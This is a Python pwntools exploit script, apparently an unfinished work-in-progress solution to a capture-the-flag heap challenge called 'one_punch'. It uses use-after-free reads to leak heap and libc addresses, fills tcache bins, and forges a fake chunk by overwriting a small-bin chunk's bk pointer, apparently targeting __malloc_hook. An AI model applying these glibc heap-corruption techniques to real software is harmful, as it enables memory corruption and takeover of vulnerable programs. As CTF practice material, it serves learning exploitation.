from pwn import *

# r = process('./one_punch', level='debug')
r = process('./one_punch')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(index, content):
    # print(content)
    r.sendlineafter('> ', '1')
    r.sendlineafter('idx: ', str(index))
    r.sendafter('hero name: ', content)
    # input('(add)')

def rename(index, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter('idx: ', str(index))
    r.sendafter('hero name: ', content)
    # input('(rename)')

def show(index):
    r.sendlineafter('> ', '3')
    r.sendlineafter('idx: ', str(index))
    r.recvuntil('name: ')
    # input('(show)')

def delete(index):
    r.sendlineafter('> ', '4')
    r.sendlineafter('idx: ', str(index))
    # input('(delete)')

def secret(content):
    r.sendlineafter('> ', str(int(0xc388)))
    r.send(content)
    # input('(secret)')


gdb.attach(r, gdbscript='c')

add(0, 'A'*0x230)
add(1, 'A'*0x230)

delete(0)
delete(1)

show(1)

heap_leak = u64(r.recvn(6).ljust(8, b'\x00'))
heap_base = heap_leak-0x2a0

log.success('Heap leak: ' + hex(heap_leak))
log.success('Heap base: ' + hex(heap_base))

addr_check = heap_base+0x30

# fill 5 tcache for later use
for i in range(5):
    add(0, 'A'*0x210)
    delete(0)

# Filling tcache of size 0x100
for i in range(7):
    add(0, 'A'*0x100)
    delete(0)

# Adding 2 chunks after tcache; This will be placed in small bin later
add(0, 'B'*0x100)
add(1, 'C'*0x100)

# Put it temporary into unsorted chunk
delete(0)

show(0)

main_arena_p96 = u64(r.recvn(6).ljust(8, b'\x00'))
libc_base = main_arena_p96-0x1bebe0
log.info('Libc base: ' + hex(libc_base))

__malloc_hook = libc_base+libc.symbols['__malloc_hook']
log.info('malloc hook: ' + hex(__malloc_hook))


'''
Heap structure until now:

[0x110 chunk #1 (free)]
.
.
[0x110 chunk #7 (free)]
[0x110 chunk #8 (free)]
[0x110 chunk #8 (alloc)]
[wilderness]
'''

# delete(1) 

# Filling tcache of size 0x160
for i in range(7):
    add(0, 'B'*0x150) # 0x120
    delete(0)

# add(0, 'X'*0x200)

# Adding 2 chunks after tcache; This will be placed in small bin later
add(0, 'C'*0x150)
add(2, 'D'*0x150)

# Deleting to prepare for coelesing
delete(0)

# Adding this chunk to avoid coalesing with top chunk
add(0, 'X'*0x160)

delete(2) 

add(0, 'K'*0x100) # chunk FF
add(2, 'B'*0x90)

delete(0) # chunk1 top
delete(1) 

add(2, 'U'*0x220) # kick unsorted chunks to small bin | fake chunk
rename(2, p64(0)*10)
# 0x1e80
# input('get fake chunk addr')
fake_chunk_addr = heap_base+0x2910

log.info('Fake chunk addr: ' + hex(fake_chunk_addr))

#rename(2, p64(0) + p64(0)) #p64(fake_chunk_addr+0x10)) # fake chunk
rename(2, p64(0) + p64(heap_base+0x20)) # fake chunk

# add(2, 'A'*0x230)
# input('get small bin off')
rename(0, p64(heap_base+0x2580) + p64(fake_chunk_addr)) # FINALLY, rewrite chunk->bk
# rename(0, p64(0) + p64(fake_chunk_addr)) # FINALLY, rewrite chunk->bk

delete(0)

input('1')

#add(1, 'A'*0x210)


input('2')

#heap_leak = u64(r.recvn(6).ljust(8, b'\x00'))
#heap_base = heap_leak-0x2a0

#log.success('Heap leak: ' + hex(heap_leak))
#log.success('Heap base: ' + hex(heap_base))

#addr_check = heap_base+0x30


r.interactive()